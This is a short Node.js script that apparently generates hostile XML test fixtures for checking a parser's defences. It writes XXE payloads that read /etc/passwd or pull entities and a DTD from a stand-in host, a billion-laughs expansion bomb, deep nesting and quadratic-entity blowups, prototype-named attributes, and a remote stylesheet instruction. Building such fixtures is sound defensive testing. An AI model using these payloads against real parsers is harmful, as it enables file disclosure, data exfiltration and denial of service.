import { mkdir, writeFile } from 'node:fs/promises';
import { URL } from 'node:url';

const directory = new URL('../../hostile/xml/', import.meta.url);
await mkdir(directory, { recursive: true });
await writeFile(new URL('xxe-file.xml', directory), '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>');
await writeFile(new URL('xxe-url.xml', directory), '<!DOCTYPE x [<!ENTITY e SYSTEM "https://example.invalid/secret">]><x>&e;</x>');
await writeFile(new URL('billion-laughs.xml', directory), '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lolz>&lol5;</lolz>');
await writeFile(new URL('deep-10000.xml', directory), `${'<x>'.repeat(10_000)}deep${'</x>'.repeat(10_000)}`);
await writeFile(new URL('xxe-parameter.xml', directory), '<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://example.invalid/evil.dtd">%remote;]><x>local</x>');
await writeFile(new URL('quadratic-entities.xml', directory), `<!DOCTYPE x [<!ENTITY a "${'q'.repeat(2048)}">]><x>${'&a;'.repeat(1000)}</x>`);
await writeFile(new URL('proto-attributes.xml', directory), '<root __proto__="plain" constructor="plain" prototype="plain"><item __proto__="also plain"/></root>');
await writeFile(new URL('pi-network.xml', directory), '<?xml-stylesheet href="https://example.invalid/remote.xsl"?><root>local</root>');
